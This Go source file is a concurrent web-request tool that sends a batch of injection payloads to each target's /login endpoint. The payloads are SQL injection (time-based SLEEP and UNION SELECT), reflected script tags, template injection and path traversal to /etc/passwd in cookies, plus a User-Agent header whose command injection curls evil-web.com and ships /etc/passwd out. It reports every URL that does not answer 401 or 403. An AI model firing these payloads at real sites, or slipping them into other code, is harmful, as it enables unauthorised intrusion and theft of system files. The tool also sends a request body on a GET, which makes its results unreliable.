package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"net/http/cookiejar"
	"os"
	"strings"
	"sync"
)

var url_list = []string{}

func main() {
	// Command Line Flags
	input := flag.String("input", "", "Input file containing URLs to check or a single URL to check")
	verbose := flag.Bool("verbose", false, "Verbose mode")
	thread_count := flag.Int("threads", 10, "Number of threads to use")

	// Parse the flags
	flag.Parse()

	// if input starts with http, then it is a URL otherwise try to read the file
	if strings.HasPrefix(*input, "http") {
		url_list = append(url_list, *input)
	} else {

		// Check if the input file is given
		if *input == "" {
			fmt.Println("Please provide the input file using -input flag")
			os.Exit(1)
		}

		// Read the file
		file, err := os.Open(*input)
		if err != nil {
			fmt.Println("Error reading the given input file")
			os.Exit(1)
		}

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			// import if the line starts with http
			if strings.HasPrefix(scanner.Text(), "http") {
				url_list = append(url_list, scanner.Text())
			}
		}

		if *verbose {
			fmt.Println("Found ", len(url_list), " URLs")
		}

		defer file.Close()
	}

	// Start checking
	var wg sync.WaitGroup
	sem := make(chan struct{}, *thread_count)

	// Start the threads
	for i := 0; i < len(url_list); i++ {
		wg.Add(1)

		// Acquire a slot in the semaphore
		sem <- struct{}{}

		go func(url string) {
			defer func() { <-sem }()
			check_url(url, verbose, &wg)
		}(url_list[i])
	}

	wg.Wait()
}

func check_url(url string, verbose *bool, wg *sync.WaitGroup) {
	defer wg.Done()

	// Check if the URL is reachable
	if *verbose {
		fmt.Println("Checking URL: ", url)
	}

	// Send a POST request to the url with cookies, headers and submit=true in the body

	// Creating Cookie Jar
	jar, err := cookiejar.New(nil)
	if err != nil {
		if *verbose {
			fmt.Println("Error creating cookie jar")
		}
		return
	}

	// Creating HTTP Client
	client := &http.Client{
		Jar: jar,
	}

	// Define the Payload
	payload := strings.NewReader("user_id=1'\"%20OR%201%3d;SLEEP(1)%231=1&email=\"><script>alert(1)</script>&password=${{7*7}}")

	// Create a HTTP request object
	url = url + "/login?email=\"><script>alert(1)</script>&password=${{7*7}}&submit=true"
	req, err := http.NewRequest("GET", url, payload)
	if err != nil {
		if *verbose {
			fmt.Println("Error creating request object")
		}
	}

	// Set the headers
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "'\"` $(curl https://evil-web.com/evil-script.sh) -d $(cat /etc/passwd)")

	// Set the cookies
	req.AddCookie(&http.Cookie{Name: "session", Value: "../../../etc/passwd"})
	req.AddCookie(&http.Cookie{Name: "user_id", Value: "-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a"})

	// Send the request
	resp, err := client.Do(req)
	if err != nil {
		if *verbose {
			fmt.Println("Error sending request")
		}
		return
	}

	// If the response code is not 401 or 403, print the URL
	if resp.StatusCode != 401 && resp.StatusCode != 403 {
		if *verbose {
			fmt.Println("[+] [", resp.Status, "] URL ", url, " is not restricted")
		} else {
			fmt.Println(url)
		}
	} else {
		if *verbose {
			fmt.Println("[!] [", resp.Status, "] URL ", url, " is restricted")
		}
	}
}
